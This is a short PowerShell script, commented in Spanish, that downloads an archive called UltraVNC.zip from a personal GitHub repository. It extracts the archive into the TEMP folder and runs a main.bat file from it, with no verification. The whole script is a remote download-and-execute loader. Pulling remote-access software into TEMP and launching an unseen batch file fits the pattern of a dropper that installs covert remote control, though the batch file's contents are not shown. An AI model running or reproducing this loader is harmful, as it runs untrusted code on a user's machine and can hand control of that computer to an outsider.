# URL del archivo ZIP en GitHub
$zipUrl = "https://github.com/matriuxgamer/ultraviewer/raw/main/UltraVNC.zip"

# Ruta donde se descargará el archivo ZIP
$zipFilePath = "$env:TEMP\UltraVNC.zip"

# Ruta donde se descomprimirá el archivo ZIP
$extractPath = "$env:TEMP\UltraVNC"

# Descargar el archivo ZIP
Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath

# Descomprimir el archivo ZIP
Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force

# Ruta al archivo main.bat dentro del ZIP
$mainBatPath = Join-Path -Path $extractPath -ChildPath "main.bat"

# Verificar si el archivo main.bat existe
if (Test-Path $mainBatPath) {
    # Ejecutar el archivo main.bat
    Start-Process -FilePath $mainBatPath -WorkingDirectory $extractPath
} else {
    Write-Host "El archivo main.bat no se encontró en el archivo ZIP descargado."
}


